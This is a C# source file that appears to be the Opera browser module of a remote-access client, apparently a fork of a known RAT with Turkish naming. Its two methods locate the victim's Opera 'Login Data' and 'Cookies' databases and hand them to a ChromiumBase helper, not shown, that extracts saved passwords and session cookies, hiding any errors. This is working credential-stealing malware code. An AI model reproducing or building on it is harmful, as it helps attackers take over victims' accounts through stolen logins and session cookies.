using System;
using System.Collections.Generic;
using System.IO;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Kurtarma.Utilities;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar
{
    public class Opera
    {
        public static List<KurtarılanHesaplar> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return ChromiumBase.Passwords(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<KurtarılanHesaplar>();
            }
        }

        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Cookies");
                return ChromiumBase.Cookies(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

       
    }
}
